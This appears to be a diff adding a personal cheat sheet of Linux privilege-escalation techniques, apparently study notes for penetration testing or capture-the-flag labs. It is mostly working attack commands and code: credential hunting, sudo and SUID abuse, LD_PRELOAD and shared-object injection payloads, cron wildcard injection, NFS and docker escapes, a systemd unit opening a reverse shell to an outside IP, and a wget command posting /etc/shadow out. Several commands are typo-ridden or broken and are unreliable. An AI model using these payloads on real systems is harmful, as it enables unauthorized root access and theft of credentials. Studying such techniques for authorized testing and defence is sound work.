@@ -1,0 +1,457 @@
+Linux Privilege escalation commands 
+system information
+
+hostname
+uname -a
+cat /proc/version
+cat /etc/issue
+lscpu -- architechture of the current OS
+ps aux 
+ps -ef
+ps aux | grep root
+
+---------------------------------------------------------------------------------------
+user enumeration
+
+whoami
+id
+sudo -l 
+cat /etc/passwd | cut -d : -f 1  --- users
+cat /etc/shadow | 
+cat /etc/group
+history
+sudo su -
+
+
+------------------------------------------------------------------------------------------------
+Network enumerations
+
+ifconfig
+ip a
+ip route
+arp -a   or ip neigh
+netstat -ano
+
+
+---------------------------------------------------------------------------------------------------
+Password Hunting
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PWD=" --color=always 2> /dev/null
+locate password | more
+locate pass | more
+find / -name authorized_keys 2> /dev/null  -- ssh keys
+find / -name id_rsa 2> /dev/null -- same as above for ssh keys
+
+-----------------------------------------------------------------------------
+Enumeration as Automation
+
+using linpeas  ---  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+
+using exploit-suggester -- https://github.com/mzet-/linux-exploit-suggester
+
+------------------------------------------------------------------------
+
+linux exploitation
+
+Kernel --- a comp program that controls almost everything in the system, and facilitates interactions between hardware and software components. 
+uname -a
+
+-------------------
+
+using password
+
+history
+
+history --- very important 
+ls -la
+
+cat .bash_history
+
+run linpeas.sh
+
+---------------------
+
+exploit weak file permissions
+
+ls -la /etc/passwd
+ls -la /etc/shadow
+
+copy the contents of passwd file and save it to new passwd file
+copy the contents of shadow file and save it to new shadow file
+using unshadow -- unshadow passwd shadow 
+now copy the contents of the results and extracts only hashes and using hashcat break
+
+
+---------------------
+exploiting using ssh
+find / -name authorized_keys 2> /dev/null ==== public key of the users
+find / -name id_rsa 2> /dev/null --- private key of the user
+ssh -i id_rsa root@192.168.1.14
+
+
+-------------------------------------------------------
+Sudo Escalation
+
+sudo -l
+gtfobins -- will provide information for binaries  -- https://gtfobins.github.io/
+
+1. VIM
+example --  sudo vim -c ':!/bin/sh'
+
+2. AWK 
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+
+-----------------------------------------------
+Intended functionalities
+
+https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/ 
+
+sudo -l
+
+sudo apache2 -f /etc/shadow
+
+sudo wget --post-file=/etc/shadow 192.168.94.146:9191
+
+--------------------------------------------------
+
+escalation with LD_PRELOAD --
+
+LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+
+To avoid this mechanism being using as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.
+
+1. create a .c file with below code
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+2. compile the file to create an object (here .so)
+
+gcc -fPIC -shared -o evil.so evil.c -nostartfiles
+
+3. run to get a shell
+sudo LD_PRELOAD=evil.so find
+
+
+https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/ 
+
+=------------------------------------
+
+exploiting with #
+sudo -l ----> it will show user(root,!root) and here the exploit will work
+
+sudo -u#+0 /bin/bash
+
+change <0> to any user value as 0 is root -- say 1003, or 1004, 
+
+https://www.exploit-db.com/exploits/47502
+
+---------------------------------------
+exploiting sudo buffer overflow
+
+sudo -V -- checking the version
+
+https://github.com/saleemrashid/sudo-cve-2019-18634.git  -- exploit
+
+pwfeedback should be enabled
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+SUID -- set User ID -- means setting user's permissions
+
+SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. 
+
+find / -perm -u=s -type f 2>/dev/null -- the command will showcase all the files with permissions set as -- -rwsr-xr-x (after doing ls -la) which means set userID(SUID) is located, where s represents the SUID
+
+Now search for https://gtfobins.github.io/#+suid and search for the result 1 by 1
+
+Now systemctl is 99% will be in a vulnerable form, so follow the below steps:
+
+1. Create a malicious file in /tmp directory with below code with name root.service
+
+[Unit]
+Description=roooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.94.146/9999 0>&1'  // Kali IP and port to listen on netcat
+
+[Install]
+WantedBy=multi.user.target
+
+2. Now save file and run the below command to create a symlink
+
+/bin/systemctl enable /tmp/root.service
+
+3. now open a netcat session with 9999 port
+nc -nlvp 9999
+
+4. now start the symlink service
+/bin/systemctl start root
+
+and on netcat we got a reverse shell with root permissions.
+
+now there are multiple things which can be done, like running the cat command to read any non-readable file such as shadow which is like
+ExecStart=/bin/bash -c "cat /etc/shadow > /tmp/output"
+
+and it will save the output in /tmp/output file
+
+https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49  
+
+
+--------------------------------------------------------
+Escalation via shared path objects   ----   also called SO Injection
+
+means injecting into the running library
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+Take the target binary..!!
+
+
+
+example 
+/home/deep/Desktop/linux_so_injection/linux-inject/sample-target
+
+find /home/deep/Desktop/linux_so_injection/linux-inject/ -type f -perm -04000 -ls 2>/dev/null 
+now run:
+
+
+
+this actually means what the binary is trying to access, this will help us to debug our target more specifically
+
+and more specifically
+
+
+
+strace /home/deep/Desktop/linux_so_injection/linux-inject/sample-target 2>&1 | grep -i -E "open|access|no such file"
+
+and chose a target .so with "No such file"
+
+which the target so is getting opened with "open and no such file" and 
+create a .c file with below code
+#################################################################################
+#include <stdio.h>								#
+#include <stdlib.h>								#
+										#
+static void inject() __attribute__((constructor));				#
+										#
+void inject() {									#
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");		#
+}										#
+#################################################################################
+
+and compile with below commamnd
+gcc -shared -fPIC -o <target-so> <malicious-so>
+
+and place in the directory 
+
+and now again run the sample-target and boom there is a root shell
+
+
+#######################################
+direct method                         #
+strace -o /dev/null /bin/sh 	      #
+#######################################
+
+-----------------------------------------------------------------------------
+Escalating via binary symlinks -- is a method to gain root priviliges via symlink attack on error log in nginx servers
+
+https://www.rapid7.com/db/vulnerabilities/gentoo-linux-cve-2016-1247/
+
+######################pre-requisites#############################################################################################################
+
+su www-data  --- if not present run the below command
+
+sudo su -l www-data -s /bin/bash -- this will directly land the shell
+														#
+																		#	
+dpkg -l | grep nginx  ---- <1.6.2 (any version below is vulnerable)										#		
+																		#
+find / -type f -perm -04000 -ls 2>/dev/null  -- so if bit "s" is set to sudo and nginx is lower to version 1.6.2, this machine would be vulnerable	#
+#################################################################################################################################################
+
+So, the idea is to replace the /var/log/nginx (the error file) with a malicious file
+
+now download the exploit from below:
+https://raw.githubusercontent.com/xl7dev/Exploit/master/Nginx/nginxed-root.sh
+
+now run
+/home/deep/Desktop/linux_niginx_symlink_exploit-less1.6.2/
+
+exploit.sh <path-to-nginx-error.log>
+
+now either restart the server or run the below command:
+
+invoke-rc.d nginx rotate >/dev/null 2>&1
+
+and boom the root shell is there.
+
+----------------------------------------------------------------
+escalation via environment variable
+
+env  --- command for environment variable
+and check for any interesting connection, or creds, or any interesting env set
+
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+now choose the target 
+
+now run strings command
+
+strings <path-of-the-target> -- find any interesting thing
+
+print $PATH
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' /tmp/service.c
+
+gcc /tmp/service.c -o /tmp/service
+
+export PATH=/tmp:$PATH
+
+print $PATH
+
+/usr/local/bin/suid-env
+
+and now again the service,
+
+the best example of the above exploitation method is apache2, or any binary which is running "service" command directly.
+
+but what about a binary if it not running the service directly but via /usr/bin/service complete path, the method is listed below:
+
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+export -f /usr/sbin/service  -- -f revoke the function
+
+and now run the malicious binary
+
+
+---------------------------------------------------------------------------
+Escalation via capabilities 
+
+linux capabilities -- Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0)
+
+getcap -r / 2>/dev/null   
+
+<vulnerable-binary with "+ep" should be there>   ep == permit everything
+
+/usr/bin/<vul-binary-cmd> -c 'import os; os.setuid(0); os.system("/bin/bash")
+
+
+------------------------------------------------------------------------------------------------------------
+Escalaation via scheduled tasks
+
+Cron job -- is a linux binary or cmd used to scheduled tasks.
+
+cat /etc/crontab  --- is a cmd to schedule tasks 
+
+systemctl list-timers --all
+
+create a malicious file as:
+
+nano overwrite.sh
+
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash 
+save
+chmod +x overwrite.sh
+
+/tmp/bash -p
+and boom bash is there,
+
+multiple things can be done here, like a bck connection and all
+
+---------------------------------
+escalation via cron wildcards (*)
+
+cat /etc/crontab -- and it has a schedule of file name "bachup.sh" with root permissions which contents are given below:
+#!/bin/bash
+cd /home/user/
+tar czf /tmp/backup.tgz *
+
+So, if clearly an * if given which then cab be exploited as:
+create a malicious file such as:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > malicious.sh
+chmod +x malicious.sh
+touch /home/user/--checkpoint=1  --- it means when the schedule will come to /home/user directory, there will be a checkpoint it has to check first
+touch /home/user/--checkpoint-action=exec=sh\malicious.sh
+
+and after the scheduled tasks, run
+/tmp/bash -p
+
+and boom root is there
+
+---------------------------------------------------------------
+Escalation with write permissions or by overwriting the cronjob
+
+cat /etc/crontab
+
+* * * * * executeme.sh
+
+now we know an executeme.sh is present. Let's check the permissions
+
+ls -la executeme.sh
+
+rwx-rw-rw root user executeme.sh
+
+so we have read and write permissions onto it. let create the malicious code:
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > executeme.sh
+
+and after the time of execution --
+
+/tmp/bash -p
+
+and boom we have the shell
+
+-------------------------------------------------------------------------
+
+Exploiting via NFS
+
+cat /etc/exports
+/tmp no_root_squash
+
+this means that /tmp is shared and can be mounted
+
+showmount -e <target-ip>
+
+mkdir /tmp/mountme
+
+mount -o rw,vers=2 <target-ip>:/tmp /tmp/mountme
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; } > /tmp/mountme/mount.c
+
+gcc /tmp/mountme/mountme.c -o /tmp/mountme/mountme
+
+chmod +s /tmp/mountme/mountme
+
+and on victim machine
+
+cd /tmp and run ./mountme
+
+--------------------------------------------------------
+exploitation via docker
+
+run linuxemum.sh or linpeas.sh
+
+and we got that we are the part of docker group
+so from gtfobins, search docker
+and from there
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+and boom we got root
+
+
